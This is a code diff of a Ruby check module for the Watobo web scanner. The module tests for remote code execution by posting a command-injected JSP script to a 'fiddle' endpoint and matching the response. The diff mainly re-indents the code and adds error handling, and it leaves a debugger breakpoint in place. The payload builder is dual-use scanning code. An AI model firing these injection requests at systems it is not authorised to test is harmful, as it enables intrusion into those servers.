@@ -39,7 +39,7 @@ EOF
           def create_payload(cmd)
             payload = 'scriptdata='
 
-            payload << URI.encode_www_form_component( FIDDLE_COMMAND_TEMPLATE.gsub(/§INJ§/, cmd).strip )
+            payload << URI.encode_www_form_component(FIDDLE_COMMAND_TEMPLATE.gsub(/§INJ§/, cmd).strip)
             payload << '&scriptext=jsp&resource='
           end
 
@@ -61,55 +61,60 @@ EOF
 
           def generateChecks(chat)
 
-            path = chat.request.path
-            Watobo::Utils.merge_paths(path, @fiddle_path) do |path|
+            begin
+              path = chat.request.path
+              Watobo::Utils.merge_paths(path, @fiddle_path) do |path|
 
-              return if @fiddle_found
-              @fiddle_cmds.each do |cmd, pattern|
-                unless @checked_locations.include? path
-                  @checked_locations << path
-                  #
-                  # via JSON Extension
+                return if @fiddle_found
+                @fiddle_cmds.each do |cmd, pattern|
+                  unless @checked_locations.include? path
+                    @checked_locations << path
+                    #
+                    # via JSON Extension
 
-                  checker = proc {
-                    begin
-                      test = chat.copyRequest
-                      test.method = 'POST'
-                      path = File.join(path, @fiddle_file)
-                      test.path = path
-                      test.set_header 'Content-Type: application/x-www-form-urlencoded'
-                      test.set_body create_payload(cmd)
+                    checker = proc {
+                      begin
+                        test = chat.copyRequest
+                        test.method = 'POST'
+                        path = File.join(path, @fiddle_file)
+                        test.path = path
+                        test.set_header 'Content-Type: application/x-www-form-urlencoded'
+                        test.set_body create_payload(cmd)
 
-                      request, response = doRequest(test, :default => true)
+                        request, response = doRequest(test, :default => true)
 
-                      if response.status and response.has_body?
-                        if response.body.to_s =~ /#{pattern}/
-                          @fiddle_found = true
-                          addFinding(request, response,
-                                     :test_item => "#{request.url}",
-                                     :proof_pattern => "#{pattern}",
-                                     :chat => chat,
-                                     :threat => "RCE",
-                                     :title => "[#{cmd}]"
-                          )
+                        if response.status and response.has_body?
+                          if response.body.to_s =~ /#{pattern}/
+                            @fiddle_found = true
+                            addFinding(request, response,
+                                       :test_item => "#{request.url}",
+                                       :proof_pattern => "#{pattern}",
+                                       :chat => chat,
+                                       :threat => "RCE",
+                                       :title => "[#{cmd}]"
+                            )
+                          end
                         end
+
+                      rescue => bang
+                        puts bang
+                        puts bang.backtrace if $DEBUG
+                        binding.pry
                       end
 
-                    rescue => bang
-                      puts bang
-                      puts bang.backtrace if $DEBUG
-                      binding.pry
-                    end
+                      [request, response]
 
-                    [request, response]
-
-                  }
-                  yield checker
+                    }
+                    yield checker
+                  end
                 end
               end
             end
+          rescue => bang
+            puts "!!! #{self} !!!"
+            puts bang
+            puts bang.backtrace if $DEBUG
           end
-
         end
       end
     end
